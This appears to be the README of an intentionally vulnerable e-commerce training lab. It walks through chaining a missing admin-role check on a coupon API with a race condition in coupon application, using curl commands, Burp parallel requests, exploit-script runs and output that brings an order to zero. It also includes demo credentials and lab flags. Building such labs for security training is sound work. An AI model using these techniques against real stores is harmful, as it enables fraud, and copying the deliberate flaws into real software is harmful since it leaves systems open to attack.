# PixelMart Lab — Chuỗi tấn công: Vượt quyền (BFLA) → Race Condition

Lab web giả lập một cửa hàng bán linh kiện máy tính (PixelMart), chứa
**hai lỗ hổng được cài đặt có chủ đích, nối tiếp nhau thành MỘT chuỗi
tấn công duy nhất** xoay quanh mã giảm giá 20%:

1. **Vượt quyền / Broken Function Level Authorization (BFLA)** —
   CWE-862 — ở API `GET /api/admin/coupon` (xem mục 2b). Mã giảm giá
   hợp lệ **không còn là hằng số công khai "SALE20"** nữa — nó được
   sinh ngẫu nhiên, lưu trong CSDL, và **chỉ admin xem được** qua khu
   vực quản trị. API nói trên là **endpoint duy nhất** trong toàn bộ
   khu vực `/api/admin/*` bị thiếu kiểm tra quyền admin, khiến một user
   thường có thể gọi thẳng để lấy được mã bí mật đó.
2. **Race Condition** dạng *Time-of-Check to Time-of-Use* (TOCTOU) —
   CWE-367 — ở chức năng áp mã giảm giá `POST /api/cart/apply-coupon`
   (xem mục 2a). Cơ chế race y hệt bản gốc, nhưng giờ **không thể khai
   thác được nếu chưa có mã thật** — tức là phải đi qua lỗ hổng #1
   trước.

Nói cách khác: **attacker phải vượt quyền để "mượn" voucher của admin,
rồi mới lợi dụng được race condition để nhân bản voucher đó.** Đây là
mô hình rất thực tế: một lỗ hổng truy xuất thông tin (information
disclosure qua BFLA) thường tự nó bị đánh giá mức độ nghiêm trọng thấp,
nhưng khi **kết hợp** với một lỗ hổng business-logic khác, hậu quả có
thể nghiêm trọng hơn nhiều so với từng lỗ hổng đứng riêng lẻ.

**Mọi chức năng quản trị khác đều được bảo vệ đúng cách** (xem mục 2c)
— lab được xây dựng kỹ để **chỉ duy nhất đường đi qua voucher** là có
vấn đề, nhằm buộc người kiểm thử phải tìm ra đúng một điểm hở trong một
hệ thống mà phần lớn đã được làm an toàn, thay vì "trúng" lỗ hổng ở bất
kỳ đâu trong khu vực quản trị.

Cả hai lỗ hổng đều là lỗi **business logic / access control**: mọi
request gửi lên đều hợp lệ về cú pháp, đúng định dạng, đúng xác thực
(có đăng nhập). Scanner tự động (ZAP, Nuclei, Nikto…) rất khó hoặc
không tìm ra: lỗ hổng BFLA chỉ lộ ra khi **so sánh hành vi của 2 tài
khoản khác cấp quyền** trên cùng một endpoint, còn race condition nằm ở
**thứ tự thời gian xử lý** giữa nhiều request song song (xem mục 5) —
cả hai đều không phải hành vi mà scanner thông thường mô phỏng.

---

## 1. Mô hình ứng dụng

PixelMart là một website bán linh kiện máy tính đầy đủ chức năng:

| Trang | Mô tả |
|---|---|
| `/` | Trang chủ: lưới sản phẩm, tìm kiếm theo tên, lọc theo danh mục |
| `/product/<id>` | Chi tiết sản phẩm: mô tả, sản phẩm liên quan, đánh giá (viết/xem) |
| `/register`, `/login` | Đăng ký tài khoản mới, đăng nhập |
| `/cart` | Giỏ hàng: xem/xoá sản phẩm, áp mã giảm giá, thanh toán |
| `/profile` | Xem/sửa thông tin cá nhân (họ tên, email, địa chỉ), đổi mật khẩu |
| `/orders`, `/orders/<id>` | Lịch sử đơn hàng (có trạng thái đơn mô phỏng) và chi tiết từng đơn (chỉ xem được đơn của chính mình) |
| `/about`, `/policy`, `/contact` | Trang giới thiệu, chính sách đổi trả/bảo hành, liên hệ (chỉ là nội dung tĩnh để tăng độ thật) |
| `/admin`, `/admin/orders` | Khu vực quản trị (**chỉ tài khoản role=admin**): bảng điều khiển thống kê (gồm cả mã giảm giá đang hoạt động), quản lý/xác minh thanh toán đơn hàng của toàn bộ khách hàng |

Luồng mua hàng: đăng ký/đăng nhập → duyệt/tìm sản phẩm (có lọc trang,
tìm kiếm, bộ lọc danh mục) → thêm vào giỏ → chọn phương thức thanh toán
(COD / chuyển khoản) → nhập mã giảm giá vào ô ở giỏ hàng (giảm 20%,
**chỉ được áp dụng 1 lần** cho mỗi giỏ hàng) → thanh toán (có tính phí
vận chuyển, miễn phí nếu đơn ≥ 300.000đ) → xem lại trong lịch sử đơn
hàng (trạng thái đơn thay đổi theo thời gian: Đang xác nhận → Đang đóng
gói → Đang giao hàng → Đã giao thành công).

> **Mã giảm giá không còn là hằng số công khai.** Ở các bản trước, mã
> `SALE20` được hiển thị thẳng trên banner/trang giỏ hàng — ai cũng bấm
> dùng được ngay. Từ bản này, mã được **sinh ngẫu nhiên khi container
> khởi động** (dạng `VIPxxxxxx`), lưu trong bảng `coupons`, và **chỉ
> hiển thị cho admin** qua `/admin`. Giao diện giỏ hàng chỉ còn một ô
> nhập tay trống — người dùng thường không có cách hợp lệ nào để biết
> mã, trừ khi admin chủ động gửi riêng (email/khuyến mãi, ngoài phạm vi
> lab). Đây chính là tiền đề cho chuỗi tấn công 2 lỗ hổng ở mục 2.

- Backend: Python Flask + SQLite, chạy trong container Docker, tự reset
  dữ liệu mỗi lần container khởi động.
- Mật khẩu được hash (werkzeug), có 20 sản phẩm mẫu thuộc 7 danh mục.
- Tài khoản demo: `tester` / `Password123!` (bạn cũng có thể tự đăng ký
  tài khoản mới qua `/register`) — tài khoản thường, `role = 'user'`.
- Tài khoản admin demo: `admin` / `AdminPixelMart#2026!` — `role = 'admin'`,
  dùng để đăng nhập xem khu vực `/admin` hợp lệ, hoặc để đối chiếu hành vi
  "đúng" so với tài khoản thường khi kiểm thử lỗ hổng vượt quyền (mục 2b).
- Giao diện có banner khuyến mãi tự động chạy, khung xương (skeleton)
  khi tải giỏ hàng, huy hiệu niềm tin (miễn phí ship/bảo hành/đổi trả),
  số lượng đã bán trên mỗi sản phẩm, avatar màu cho người đánh giá,
  trang 404/500 tuỳ biến, SEO meta tag cơ bản, favicon, và bố cục tự co
  giãn trên di động (responsive).
- Giao diện sáng (light theme), tông xanh dương chủ đạo, dạng sàn TMĐT
  thật (topbar khuyến mãi, navbar có ô tìm kiếm + icon giỏ hàng, subnav
  danh mục, thẻ sản phẩm nền trắng bo góc đổ bóng, giá gạch ngang so
  sánh, phân trang kiểu nút tròn, footer nhiều cột) — lấy cảm hứng
  layout/màu từ một frontend TMĐT tham khảo, viết lại hoàn toàn bằng
  CSS thuần (`static/style.css`), không dùng framework/build step. Mọi
  route, tên trường form, id phần tử dùng trong JS (giỏ hàng, checkout)
  đều giữ nguyên — chỉ thay đổi giao diện, không đổi logic.
- Mỗi sản phẩm có 3 ảnh minh hoạ phong cách studio (`static/products/
  p<id>_1.jpg`, `_2.jpg`, `_3.jpg`) được vẽ hoàn toàn offline bằng
  Pillow (minh hoạ vector đơn giản theo từng loại sản phẩm, không tải
  ảnh/logo thật từ Internet) nên không có rủi ro bản quyền/thương hiệu
  và không cần mạng khi chạy trong Docker. Trang chủ/sản phẩm liên
  quan/giỏ hàng dùng ảnh đầu tiên làm ảnh đại diện; trang chi tiết sản
  phẩm có gallery 3 ảnh bấm để đổi ảnh chính.

  **Muốn dùng ảnh chụp thật thay vì ảnh vector?** Môi trường build/chạy
  sandbox dùng để phát triển lab này có tường lửa chỉ cho phép ra
  Internet tới các kho gói (pip/npm) và GitHub, nên không thể tự tải
  ảnh từ các kho ảnh stock (Unsplash/Pexels/Openverse...) ngay trong đó.
  Thay vào đó, repo có sẵn script tuỳ chọn `scripts/fetch_real_product_images.py`
  — chạy **một lần, thủ công, trên máy có Internet thật** (máy Windows
  của bạn, hoặc VM Debian nếu nó có mạng ra ngoài):

  ```bash
  pip install --break-system-packages requests pillow
  python3 scripts/fetch_real_product_images.py
  ```

  Script tự tìm và tải ảnh thật qua Openverse API (kho tổng hợp ảnh có
  giấy phép mở, miễn phí, không cần API key), chỉ lấy ảnh được phép
  dùng thương mại, resize/crop về đúng kích thước rồi **ghi đè** vào
  đúng `static/products/p<id>_1/2/3.jpg` — không cần sửa gì ở
  template/app.py. Nguồn/giấy phép từng ảnh được ghi lại vào
  `static/products/SOURCES.md` để tra cứu. Chạy xong thì build lại
  (`docker compose up --build -d`) là ảnh mới lên ngay. Nếu không chạy
  script này, lab vẫn hoạt động bình thường với ảnh vector có sẵn.
- Nút **Thanh toán** mô phỏng luồng checkout thật: hiện popup loading
  (~1.2-1.7s) rồi mới mở popup "Đặt hàng thành công" (có mã đơn, số
  tiền, email xác nhận, và flag nếu khai thác thành công) thay vì trả
  kết quả tức thì ra dòng chữ trên trang. Đây **chỉ là độ trễ hiển thị
  phía client** (JS `setTimeout`) — request thật tới `/api/cart/checkout`
  vẫn được gửi và xử lý ngay lập tức, không có gì thay đổi ở backend.
  Mục đích là để giao diện không "lộ" kết quả bất thường một cách lộ
  liễu khi bấm nút thủ công, buộc người kiểm thử phải bắt/gửi lại
  request bằng Burp Repeater hoặc script (như `exploit/race_coupon.py`)
  thay vì chỉ click nút nhanh tay trên UI mới phát hiện và khai thác
  được race condition.
- Nút **Dùng mã** (áp mã giảm giá) áp dụng đúng cùng cơ chế: bấm vào sẽ
  bị **disable ngay lập tức** (chặn double-click tay thật) và hiện popup
  loading ~0.9-1.4s rồi mới ra popup kết quả (thành công/thất bại) thay
  vì phản hồi ngay. Cũng chỉ là độ trễ hiển thị phía client — request
  thật tới `/api/cart/apply-coupon` vẫn được xử lý tức thì. Kết hợp cả
  hai nút, việc chỉ bấm tay liên tục trên trình duyệt (kể cả rất nhanh)
  **không còn khả thi** để kích hoạt race condition nữa — phải chủ đích
  gửi nhiều request đồng thời bằng Burp Repeater (gộp nhóm gửi song
  song) hoặc script (`exploit/race_coupon.py`, dùng `threading`) mới
  khai thác được, đúng tinh thần một lỗ hổng business-logic yêu cầu tư
  duy kiểm thử chủ động thay vì chỉ thao tác UI thông thường.

> **Lưu ý về phạm vi lỗ hổng:** toàn bộ các chức năng còn lại (đăng ký,
> trang cá nhân, lịch sử đơn hàng, đánh giá sản phẩm, và **gần như toàn
> bộ** khu vực `/admin/*`) đều được viết an toàn có chủ đích — có kiểm
> tra quyền sở hữu (vd. `/orders/<id>` chỉ cho xem đơn hàng của chính
> người đăng nhập), có kiểm tra quyền admin đúng cách trên MỌI endpoint
> `/api/admin/*` **trừ một endpoint duy nhất**, dùng parameterized
> query, không có `|safe` trong template. **Lab có đúng HAI lỗ hổng đã
> được xác nhận, được thiết kế để nối tiếp nhau thành một chuỗi tấn
> công duy nhất**: vượt quyền ở `GET /api/admin/coupon` (mục 2b) để lấy
> mã giảm giá bí mật, sau đó race condition ở `/api/cart/apply-coupon`
> (mục 2a) để nhân bản mã đó. Các chức năng khác — kể cả các endpoint
> quản trị khác như `GET /api/admin/orders` hay
> `POST /api/admin/orders/<id>/update-status` — chỉ để làm bối cảnh
> giống một cửa hàng thật và chứng minh "không phải cứ vào được khu vực
> quản trị là vượt quyền được ở mọi nơi", không phải để tìm thêm lỗi.

## 2a. Lỗ hổng #1 — Race Condition (TOCTOU) ở coupon

File `app.py`, route `/api/cart/apply-coupon`. Luồng xử lý:

```
1. TIME OF CHECK : SELECT coupon_applied FROM carts WHERE id = ?
2. (giả lập xử lý nghiệp vụ tốn thời gian — sleep 0.35s)
3. TIME OF USE   : UPDATE carts SET coupon_applied = 1, coupon_uses += 1
```

Bước kiểm tra (1) và bước ghi nhận (3) **không nằm trong một thao tác
nguyên tử (atomic)**. Giữa hai bước có một khoảng trễ (race window).
Nếu nhiều request `apply-coupon` được gửi gần như đồng thời, tất cả đều
đọc `coupon_applied = 0` ở bước (1) **trước khi** bất kỳ request nào
kịp ghi `coupon_applied = 1` ở bước (3) — nên tất cả đều vượt qua điều
kiện kiểm tra và cộng dồn giảm giá 20% nhiều lần.

Hệ quả: giỏ hàng trị giá hàng triệu đồng có thể giảm về gần 0đ.

> Lưu ý sư phạm: độ trễ `time.sleep(0.35)` được thêm vào có chủ đích để
> race window đủ rộng, dễ khai thác bằng tay hoặc bằng script đơn giản.
> Trong thực tế race window thường hẹp hơn nhiều (vài mili-giây do độ
> trễ I/O của database thật), nhưng bản chất lỗi và cách khai thác
> (bắn nhiều request song song) là giống hệt.

**Khác biệt quan trọng so với bản trước:** điều kiện `code != coupon_hop_le`
giờ so sánh với giá trị đọc từ bảng `coupons` trong CSDL — một mã **sinh
ngẫu nhiên** (vd. `VIP7A3F1C`), không còn là chuỗi `"SALE20"` hardcode
trong code hay hiển thị công khai ở bất kỳ đâu. Cơ chế race (sleep giữa
SELECT và UPDATE) hoàn toàn không đổi — nhưng giờ **vô dụng nếu attacker
chưa biết mã thật**, vì mọi request với mã sai đều bị từ chối ngay ở
bước kiểm tra mã, trước khi chạm tới đoạn code có lỗi race. Đây chính là
lý do lỗ hổng #2 trở nên cần thiết.

---

## 2b. Lỗ hổng #2 — Vượt quyền (Broken Function Level Authorization)

### Mô hình phân quyền

`users` có cột `role` (`'user'` mặc định, hoặc `'admin'`). Khu vực quản
trị `/admin/*` dùng 2 lớp kiểm tra:

- Trang HTML (`/admin`, `/admin/orders`): decorator `admin_required_page`
  — chưa đăng nhập thì chuyển hướng `/login`, đăng nhập nhưng không phải
  admin thì trả về **404** (không lộ rằng trang này tồn tại).
- API JSON (`/api/admin/*`): hàm `require_admin()` — chưa đăng nhập trả
  **401**, không phải admin trả **403**.

**Mọi route quản trị đều áp dụng đúng 2 lớp kiểm tra này — kể cả API
quản lý đơn hàng (`GET /api/admin/orders`,
`POST /api/admin/orders/<id>/update-status`) — TRỪ ĐÚNG MỘT API**:

```python
@app.route("/api/admin/coupon", methods=["GET"])
def api_admin_coupon():
    # !!! VULN: chi goi require_login() (kiem tra DA DANG NHAP),
    # QUEN goi require_admin() (kiem tra CO PHAI ADMIN) nhu moi
    # endpoint /api/admin/* khac !!!
    auth = require_login()
    if auth:
        return auth
    ...
    coupon = get_active_coupon(db)
    return jsonify({"code": coupon["code"], "percent": coupon["percent"], ...})
```

Đây là API dùng để admin xem mã giảm giá đang hoạt động (khối **"Mã
giảm giá đang hoạt động"** ở trang `/admin`). Vì thiếu dòng kiểm tra
quyền admin, **bất kỳ user nào đã đăng nhập** — kể cả một tài khoản vừa
tự đăng ký — đều có thể gọi thẳng API này để lấy được **mã giảm giá bí
mật của admin**.

Hậu quả **tự thân** của lỗ hổng này (rò rỉ một chuỗi ký tự) nghe có vẻ
nhỏ — nhưng mã đó chính là "chìa khoá" để khai thác tiếp lỗ hổng #1
(race condition), nơi hậu quả thực sự xảy ra: nhân bản discount, mua
hàng gần như 0đ. Đây là ví dụ điển hình cho việc **đánh giá mức độ
nghiêm trọng của một lỗ hổng không thể tách rời khỏi những gì nó mở ra
tiếp theo** trong một chuỗi tấn công thực tế.

### Vì sao lại "khó" hơn kiểu lỗi mass-assignment đơn giản

Lab **cố tình không** để lộ lỗ hổng theo kiểu dễ nhất ("gửi thêm field
`role=admin` vào form `/profile`" — field `role` **không hề** được nhận
từ client ở bất kỳ endpoint cập nhật hồ sơ nào, không có mass assignment
ở đó). Thay vào đó, người kiểm thử phải:

1. **Trinh sát** để biết khu vực quản trị tồn tại — `robots.txt` cố tình
   tiết lộ `Disallow: /admin` và `Disallow: /static/js/` (một lỗi trinh
   sát rất thật: nhiều site vô tình để lộ cấu trúc nhạy cảm qua robots.txt).
2. **Nhận ra mã giảm giá không còn công khai** — trang `/cart` chỉ có một
   ô nhập tay trống, không còn chip mã bấm-là-dùng-được như trước.
3. **Đọc bundle JS tĩnh** `static/js/admin-coupon.js` — file này được
   Flask phục vụ qua cơ chế `/static/` **mặc định, không hề được bảo vệ
   bởi `admin_required_page`**, dù nó chỉ được dùng trên trang đã được
   bảo vệ đó. Đọc file này (không cần đăng nhập) lộ ra chính xác API
   `GET /api/admin/coupon`.
4. **So sánh hành vi giữa 2 tài khoản khác cấp quyền** (đăng ký một tài
   khoản thường, thử endpoint đó, so với việc `/admin` trang HTML và
   `GET /api/admin/orders`/`POST .../update-status` đều bị chặn đúng
   cách) — để nhận ra ĐÚNG MỘT endpoint trong cả cụm quản trị bị thiếu
   kiểm tra, thay vì toàn bộ khu vực admin đều hở (hoặc hoàn toàn an
   toàn, không có gì để khai thác).

Đây là mô hình lỗi rất thực tế trong các hệ thống lớn: Broken Function
Level Authorization (OWASP API Security Top 10 — API5:2023) thường xảy
ra chính xác theo kiểu này — nhà phát triển bảo vệ đúng hầu hết endpoint
nhưng **quên đúng một chỗ** khi thêm tính năng mới, và endpoint đó không
hiện trên UI cho user thường nên dễ bị bỏ sót khi test thủ công thông
thường (chỉ test bằng cách click qua giao diện).

---

## 2c. Chuỗi tấn công kết hợp — từ vượt quyền đến race condition

Hai lỗ hổng ở trên **vô dụng nếu đứng riêng**:

- Chỉ có BFLA (mục 2b) → attacker lấy được mã giảm giá, nhưng dùng mã
  đó bình thường thì cũng chỉ được giảm giá 20% **đúng 1 lần** như mọi
  khách hàng khác — không có gì bất thường, không có "lỗi" thực sự xảy
  ra.
- Chỉ có race condition (mục 2a) → cơ chế TOCTOU vẫn còn đó về mặt kỹ
  thuật, nhưng **không thể khai thác được** vì attacker không có mã hợp
  lệ để thử — mọi request race đều bị chặn ngay ở bước kiểm tra mã.

**Chỉ khi kết hợp cả hai theo đúng thứ tự**, attacker mới đạt được hậu
quả thực sự nghiêm trọng:

```
┌─────────────────────┐     ┌──────────────────────┐     ┌───────────────────────┐
│ 1. Trinh sát          │ --> │ 2. Vượt quyền (BFLA)   │ --> │ 3. Race condition      │
│    robots.txt +       │     │    GET /api/admin/      │     │    POST /api/cart/      │
│    static JS tĩnh      │     │    coupon (thiếu check  │     │    apply-coupon (nhiều  │
│    (không cần login)   │     │    admin) -> lộ mã thật │     │    luồng cùng lúc)      │
└─────────────────────┘     └──────────────────────┘     └───────────────────────┘
                                                                        │
                                                                        v
                                                        ┌───────────────────────┐
                                                        │ 4. Checkout            │
                                                        │    giỏ hàng gần như 0đ │
                                                        │    + flag              │
                                                        └───────────────────────┘
```

Mỗi bước được "chấm điểm" độc lập bằng một flag riêng, để người kiểm
thử (hoặc người chấm bài) xác nhận được đã hoàn thành đúng từng giai
đoạn của chuỗi:

| Bước | Flag | Ý nghĩa |
|---|---|---|
| Vượt quyền lấy mã (2b) | `LAB{bfla_leaked_admin_voucher_pixelmart}` | Xác nhận đã khai thác được BFLA, lấy mã giảm giá của admin |
| Race condition + checkout (2a) | `LAB{race_cond1tion_t0ctou_coupon_stack_pixelmart}` | Xác nhận đã dùng mã lấy được ở bước trên để khai thác race condition, hoàn tất đơn hàng gần như 0đ |

Script `exploit/race_coupon.py` mô phỏng đúng chuỗi này trong MỘT lần
chạy (tự leak mã nếu không được truyền `--code`), còn
`exploit/leak_admin_coupon.py` tách riêng bước 1-2 để minh hoạ rõ từng
giai đoạn — xem hướng dẫn chi tiết (kể cả cách làm thủ công bằng Burp)
ở mục 4.

---

## 3. Triển khai bằng Docker trên Debian

### 3.1. Cài Docker (nếu máy Debian chưa có)

```bash
sudo apt update && sudo apt install -y docker.io docker-compose-plugin
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # rồi đăng xuất/đăng nhập lại để khỏi cần sudo
```

### 3.2. Build và chạy lab

```bash
git clone https://github.com/tuanhungh81sc/pixelmart.git
cd pixelmart
docker compose up --build -d
```

Kiểm tra container đang chạy:

```bash
docker compose ps
docker compose logs -f
```

Mở trình duyệt tới `http://localhost:5000`, đăng nhập bằng
`tester` / `Password123!`.

### 3.3. Dừng / reset lab

```bash
docker compose down        # dừng
docker compose up --build -d   # chạy lại, dữ liệu tự reset sạch
```

---

## 4. Hướng dẫn kiểm thử thủ công (Burp Suite / trình duyệt)

Khác với bản trước, bạn **chưa có mã giảm giá hợp lệ nào** ngay từ đầu
— `/cart` chỉ có một ô nhập tay trống. Phải đi đúng theo chuỗi 2 lỗ
hổng: trinh sát + vượt quyền để lấy mã (mục 4a dưới), rồi mới race
được (mục 4c). Nếu chỉ muốn test riêng cơ chế race với một mã bất kỳ đã
biết (vd. để chấm điểm nhanh), có thể bỏ qua 4a và tự lấy mã qua
`/admin` bằng tài khoản admin có sẵn.

### Bước 4a — Trinh sát + vượt quyền để lấy mã (xem chi tiết đầy đủ ở mục 4b)

Tóm tắt nhanh (chi tiết từng lệnh ở mục 4b ngay dưới):

```bash
curl -s http://localhost:5000/robots.txt                      # -> thấy /admin, /static/js/
curl -s http://localhost:5000/static/js/admin-coupon.js       # -> lộ endpoint GET /api/admin/coupon
# đăng nhập bằng TÀI KHOẢN THƯỜNG (không phải admin), rồi:
curl -s -b cookies.txt http://localhost:5000/api/admin/coupon
# -> {"code": "VIPxxxxxx", "percent": 20, "active": true, "flag": "LAB{bfla_leaked_admin_voucher_pixelmart}"}
```

Ghi lại giá trị `code` — đây chính là mã sẽ dùng để race ở bước 4c.

### Bước 4b — Chi tiết kiểm thử vượt quyền (BFLA)

#### Trinh sát, tìm khu vực quản trị

```bash
curl -s http://localhost:5000/robots.txt
```

Sẽ thấy `Disallow: /admin` và `Disallow: /static/js/` — gợi ý có khu
vực quản trị. Đăng nhập bằng tài khoản `tester` thường (không phải
admin) rồi thử mở `/admin` trên trình duyệt — sẽ bị trả về trang 404,
**không phải** trang đăng nhập hay trang "không có quyền" rõ ràng, nên
chưa chắc chắn `/admin` có tồn tại hay không chỉ bằng cách này.

#### Đọc bundle JS tĩnh (không cần đăng nhập)

```bash
curl -s http://localhost:5000/static/js/admin-coupon.js
```

File này **không yêu cầu đăng nhập** (được phục vụ như mọi file static
khác). Đọc nó sẽ thấy rõ API:

```js
fetch('/api/admin/coupon')   // GET - tra ve ma giam gia dang hoat dong
```

Có thể đối chiếu thêm với `static/js/admin-orders.js` (dùng cho trang
quản lý đơn hàng) — file này cũng công khai và lộ ra 2 API khác:
`GET /api/admin/orders` và
`POST /api/admin/orders/<id>/update-status`. Hai API đó **đều được bảo
vệ đúng cách** (xem bước tiếp theo) — dùng để đối chứng rằng không phải
mọi API quản trị đều hở, chỉ đúng một chỗ.

#### So sánh hành vi các API bằng tài khoản thường

Đăng nhập Burp/trình duyệt bằng `tester` / `Password123!` (tài khoản
**thường**, không phải admin), rồi thử lần lượt:

```bash
curl -s -b cookies.txt -i http://localhost:5000/api/admin/orders
# -> HTTP 403 Forbidden (API này kiểm tra quyền admin đúng cách)

curl -s -b cookies.txt -i -X POST http://localhost:5000/api/admin/orders/1/update-status \
  -H "Content-Type: application/json" \
  -d '{"payment_verified": true, "admin_note": "verified by non-admin!"}'
# -> HTTP 403 Forbidden (API nay cung da duoc bao ve dung cach - KHONG con la lo hong)

curl -s -b cookies.txt -i http://localhost:5000/api/admin/coupon
# -> HTTP 200 OK  <-- LỖ HỔNG: endpoint "anh em" lại không chặn!
# {"code":"VIPxxxxxx","percent":20,"active":true,"flag":"LAB{bfla_leaked_admin_voucher_pixelmart}"}
```

Ba request trên minh họa chính xác thiết kế của lab: trong cả cụm API
`/api/admin/*`, chỉ **đúng một** (`GET /api/admin/coupon`) thiếu kiểm
tra quyền admin — mọi chức năng quản trị khác (xem đơn hàng, xác minh
thanh toán...) đều đòi hỏi đúng quyền.

#### Khai thác bằng script có sẵn trong lab

```bash
pip install --break-system-packages requests
python3 exploit/leak_admin_coupon.py --url http://localhost:5000
```

Script tự động thực hiện đúng các bước trên: đọc `robots.txt`, kiểm
tra `/cart` không lộ mã công khai, tải JS tĩnh `admin-coupon.js`, tự
đăng ký một tài khoản tấn công (không phải admin), xác nhận tài khoản
đó KHÔNG xem được `/admin`/`GET /api/admin/orders`, rồi gọi thẳng
`GET /api/admin/coupon` và in ra mã giảm giá leak được + flag
`LAB{bfla_leaked_admin_voucher_pixelmart}`, kèm gợi ý lệnh để chạy tiếp
bước race condition với mã đó.

---

## 4c. Khai thác race condition (sau khi đã có mã từ bước 4a/4b)

### Bước 1 — Xác nhận hành vi "bình thường" (chặn áp mã 2 lần)

1. Đăng nhập, thêm 1 sản phẩm bất kỳ vào giỏ.
2. Mở trang giỏ hàng `/cart`, dán mã vừa lấy được (vd. `VIPxxxxxx`) vào
   ô **Nhập mã giảm giá...**, bấm **Dùng mã** → thấy giảm 20%.
   (Hai mã trang trí `FREESHIP50` và `WELCOME10` hiển thị bên dưới
   không hoạt động — không phải mục tiêu khai thác của lab này.)
3. Dán lại mã đó, bấm **Dùng mã** lần nữa → ứng dụng báo lỗi
   `coupon already applied`.

→ Điều này cho thấy có một cơ chế kiểm tra "đã dùng chưa", và nó **hoạt
động đúng khi gửi tuần tự**. Đây chính là điểm khiến scanner tự động bỏ
qua: test tuần tự không phát hiện ra vấn đề gì.

### Bước 2 — Soi request bằng Burp Suite

1. Bật Burp, trỏ proxy trình duyệt qua Burp (`127.0.0.1:8080`).
2. Thêm sản phẩm vào giỏ, mở **Proxy → HTTP history**, tìm request:

   ```
   POST /api/cart/apply-coupon HTTP/1.1
   Host: localhost:5000
   Cookie: session=...
   Content-Type: application/json

   {"code":"VIPxxxxxx"}
   ```
3. Click phải → **Send to Repeater**.
4. Trong Repeater, gửi request này 2 lần liên tiếp bằng tay → lần 2 báo
   lỗi `coupon already applied` (xác nhận lại bước 1).

### Bước 3 — Khai thác race condition bằng Burp Repeater (nhóm song song)

Burp Suite 2023.9 trở lên hỗ trợ gửi nhiều request trong Repeater **cùng
lúc** qua kỹ thuật *single-packet attack* (giảm jitter mạng xuống gần 0):

1. Trong tab Repeater đang có request `apply-coupon`, nhấn **Ctrl** (hoặc
   **Cmd** trên Mac) và click để chọn thêm nhiều tab Repeater khác đang
   chứa cùng request đó (hoặc duplicate tab request đó ra 15–20 tab).
2. Click phải vào nhóm tab đã chọn → **Send group in parallel**
   (hoặc **Send group in sequence (single connection)** tùy phiên bản).
3. Chọn chế độ gửi song song nhất có thể.
4. Sau khi gửi, kiểm tra từng response trong nhóm: nếu nhiều hơn 1
   response trả về `"ok": true` (thay vì chỉ 1 cái `ok` và phần còn lại
   `coupon already applied`) → **đã khai thác thành công race
   condition**.
5. Quay lại trình duyệt, refresh giỏ hàng → thấy `coupon_uses` > 1,
   `final_price` giảm sâu bất thường (có thể về 0đ).
6. Bấm **Thanh toán** → nếu áp mã ≥ 3 lần và giá cuối ≤ 10% giá gốc,
   ứng dụng trả về `flag` trong JSON response của `/api/cart/checkout`.

> Nếu chưa có Burp Suite Pro (tính năng gửi song song chỉ có ở bản trả
> phí hoặc extension Turbo Intruder), dùng script ở Bước 4 — hiệu quả
> tương đương và miễn phí.

### Bước 4 — Khai thác bằng script có sẵn trong lab

Lab đi kèm sẵn script khai thác tại `exploit/race_coupon.py`.

```bash
pip install --break-system-packages requests
python3 exploit/race_coupon.py --url http://localhost:5000 \
    --user tester --password 'Password123!' --threads 20
```

Script sẽ tự động:
1. Đăng nhập, lấy cookie session.
2. Thêm 1 sản phẩm vào giỏ.
3. Dùng `threading` để bắn 20 request `apply-coupon` gần như đồng thời
   vào đúng race window (0.35s).
4. In ra số request thành công, trạng thái giỏ hàng, rồi tự gọi
   checkout để lấy giá cuối cùng và flag.

**Kết quả thực tế khi test lab này** (threads=15):

```
[+] So request ap ma THANH CONG: 15 / 15

[+] Gio hang sau tan cong:
      coupon_uses  = 15   (ky vong neu AN TOAN: toi da 1)
      subtotal     = 1,200,000d
      discount     = 3,600,000d
      final_price  = 0d

[!!!] KHAI THAC THANH CONG: ma giam gia 'chi dung 1 lan' da bi cong don
      15 lan do race condition (TOCTOU)!

[+] Ket qua checkout: {'coupon_uses': 15, 'discount': 3600000,
    'final_price': 0, 'flag': 'LAB{race_cond1tion_t0ctou_coupon_stack_pixelmart}',
    'ok': True, 'subtotal': 1200000}
```

Toàn bộ giỏ hàng trị giá 1.200.000đ được mua với giá **0đ**.

### Bước 5 (tuỳ chọn) — Khai thác thủ công bằng `curl` song song

Nếu muốn tự tay làm mà không cần Python, có thể dùng vòng lặp `curl`
chạy nền (độ chính xác thời gian kém hơn threading, nhưng vẫn có thể
khai thác được nhờ race window rộng 0.35s):

```bash
# Đăng nhập trước, lưu cookie
curl -s -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=tester&password=Password123!" -o /dev/null

# Thêm sản phẩm
curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/add \
  -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1}'

# Bắn 15 request áp mã song song (thay VIPxxxxxx bằng mã lấy được ở bước 4a)
for i in $(seq 1 15); do
  curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/apply-coupon \
    -H "Content-Type: application/json" -d '{"code":"VIPxxxxxx"}' &
done
wait

# Kiểm tra giỏ hàng
curl -s -b cookies.txt http://localhost:5000/api/cart
```

---

## 5. Vì sao scanner tự động không phát hiện được

**Lỗ hổng #1 (race condition):**

- Mỗi request riêng lẻ đều là request hợp lệ: đúng xác thực (có
  session cookie), đúng định dạng JSON, đúng mã giảm giá thật.
- Không có payload độc hại (không SQLi, không XSS, không path
  traversal) để scanner dựa vào signature.
- Lỗi chỉ xuất hiện khi **nhiều request được gửi đúng thời điểm** —
  đây là hành vi mà scanner DAST thông thường (chạy tuần tự, mỗi lần
  một request) không mô phỏng.
- Cần tư duy nghiệp vụ: hiểu "coupon chỉ dùng 1 lần" là một ràng buộc
  logic, rồi tự đặt câu hỏi "ràng buộc này được thực thi nguyên tử hay
  không?" — đây là bước chỉ con người (hoặc công cụ chuyên biệt như
  Burp Turbo Intruder) mới làm được.

**Lỗ hổng #2 (vượt quyền/BFLA):**

- Scanner DAST chạy với **một** phiên đăng nhập duy nhất (thường là tài
  khoản admin/cấp cao được cấu hình để crawl được nhiều trang nhất) sẽ
  thấy mọi endpoint `/api/admin/*` đều trả 200 — không có gì "sai cú
  pháp" để báo lỗi.
- Phát hiện được lỗi này đòi hỏi kiểm thử theo đúng phương pháp
  **authorization testing**: lặp lại CÙNG MỘT tập request bằng **nhiều
  cấp quyền khác nhau** (ẩn danh / user thường / admin) rồi so sánh kết
  quả — đây là tính năng của các công cụ chuyên biệt (Burp Suite
  Autorize/Auth Analyzer extension, OWASP ZAP access-control testing)
  hoặc phải làm thủ công, **không phải** hành vi mặc định của hầu hết
  scanner phổ thông.
